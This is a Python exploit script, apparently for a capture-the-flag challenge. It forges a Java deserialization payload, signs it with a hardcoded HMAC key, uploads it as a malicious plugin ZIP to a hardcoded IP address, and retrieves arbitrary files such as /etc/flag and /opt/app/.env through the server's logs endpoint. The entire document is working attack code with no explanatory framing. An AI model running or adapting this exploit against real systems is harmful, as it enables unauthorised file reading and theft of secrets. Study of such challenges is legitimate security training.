#!/usr/bin/env python3
"""
Agent Plugin Exploit - Pure Python (no javac needed)
"""
import sys, json, re, struct, io, zipfile, base64, hashlib, hmac, time, uuid
import requests

HOST = "http://39.105.213.28:9000"
KEY = b"k3y_5A62_X86"

TPL = base64.b64decode(
    "rO0ABXNyADJjb20uYWdlbnQudXBkYXRlLmRlc2VyaWFsaXphdGlvbi5SZXNvdXJjZVJl"
    "ZnJlc2hlcgAAAAAAAAABAgACTAAKZGF0YVN0cmVhbXQALUxjb20vYWdlbnQvdXBkYXRl"
    "LmRlc2VyaWFsaXphdGlvbi9EYXRhU3RyZWFtO0wACnRhcmdldFBhdGh0ABJMamF2YS9s"
    "YW5nL1N0cmluZzt4cHNyACtjb20uYWdlbnQudXBkYXRlLmRlc2VyaWFsaXphdGlvbi5E"
    "YXRhU3RyZWFtAAAAAAAAAAECAAJMAAhleHBvcnRlcnQAL0xjb20vYWdlbnQvdXBkYXRl"
    "LmRlc2VyaWFsaXphdGlvbi9GaWxlRXhwb3J0ZXI7TAAJaW5wdXRQYXRocQB+AAJ4cHNy"
    "AC1jb20uYWdlbnQudXBkYXRlLmRlc2VyaWFsaXphdGlvbi5GaWxlRXhwb3J0ZXIAAAAA"
    "AAAAAQIAAUwABnRlYW1JZHEAfgACeHB0AAVhZG1pbnB0AAkvZXRjL2ZsYWc="
)
def mkpayload(target, tag):
    """Patch the serialized blob: replace target path + teamId.
    The template has teamId="admin" (5 chars) and targetPath="/etc/flag".
    We replace both while keeping the same byte lengths or adjusting TC_STRING."""
    raw = TPL

    # Replace teamId: "admin" (5 bytes) -> tag (must be 5 chars)
    if len(tag) != 5:
        tag = tag.ljust(5, "x")[:5]
    # "admin" appears as TC_STRING data: 74 00 05 61 64 6D 69 6E
    # Search for the 5 bytes of "admin" (not part of class descriptors)
    # In our template, "admin" appears only once as a field value
    idx_adm = raw.find(b"admin")
    if idx_adm > 0 and raw[idx_adm-1] == 0x05:  # preceded by length 5
        raw = raw[:idx_adm] + tag.encode() + raw[idx_adm+5:]

    # Replace target path: "/etc/flag" (9 bytes)
    idx_path = raw.rfind(b"/etc/flag")
    if idx_path < 0:
        raise Exception("template broken")
    pb = target.encode()
    raw = raw[:idx_path-3] + b"\x74" + struct.pack(">H", len(pb)) + pb

    return raw


def sign(d):
    return base64.b64encode(hmac.new(KEY, d, hashlib.sha256).digest()).decode()


def pack(ser):
    """Create the plugin ZIP with valid HMAC"""
    mf = json.dumps({"pluginName": "p", "version": "1", "hmacSignature": sign(ser)})
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("manifest.json", mf)
        z.writestr("metadata.ser", ser)
    return buf.getvalue()


def send_zip(data, tid):
    """POST malicious plugin -> trigger deserialization"""
    return requests.post(
        f"{HOST}/api/upload?team_id={tid}",
        files={"file": ("pkg.zip", io.BytesIO(data), "application/zip")},
        timeout=30
    )
def fetch_logs(tid, maxbytes=500000):
    """Stream log entries for a team (capped to avoid OOM)"""
    r = requests.get(f"{HOST}/api/logs?team_id={tid}", stream=True, timeout=20)
    acc = ""
    for chunk in r.iter_content(8192, decode_unicode=True):
        if chunk:
            acc += chunk
            if len(acc) > maxbytes:
                break
    return acc
def locate(blob):
    """Find ISCC{...} patterns, skip decoy"""
    for m in re.finditer(r"ISCC\{[^}]+\}", blob):
        v = m.group()
        if "f4k3" not in v and "d3c0y" not in v:
            return v
    return None
def try_one(path):
    """Attempt to read one file path"""
    tag = uuid.uuid4().hex[:5]  # 5 chars
    ser = mkpayload(path, tag)
    z = pack(ser)
    resp = send_zip(z, tag)
    if resp.status_code != 200 and resp.status_code != 500:
        print(f"  [{path}] HTTP {resp.status_code}")
        return None
    time.sleep(1.5)
    raw = fetch_logs(tag)
    flag = locate(raw)
    if flag:
        return flag
    # Also check admin bucket in case teamId patch failed
    raw2 = fetch_logs("admin")
    flag2 = locate(raw2)
    if flag2:
        return flag2
    # Show what happened
    for m in re.finditer(r'"message":"[^"]*'+re.escape(path)+'[^"]*"', raw):
        msg = json.loads("{"+m.group()+"}")["message"]
        snippet = msg.split("Content:")[-1] if "Content:" in msg else msg
        if len(snippet) > 80:
            snippet = f"({len(snippet)} bytes)"
        print(f"  [{path}] {snippet}")
        return None
    print(f"  [{path}] not found")
    return None


if __name__ == "__main__":
    print("--- Agent Plugin Exploit ---")
    targets = sys.argv[1:] if len(sys.argv) > 1 else [
        "/opt/app/.env", "/opt/app/flag", "/etc/flag",
        "/flag", "/app/flag",
    ]
    for t in targets:
        r = try_one(t)
        if r:
            print(f"\nflag是{r}")
            break
    else:
        print("\n没有flag.尝试python3 4.py /app/agent-update-system.jar")
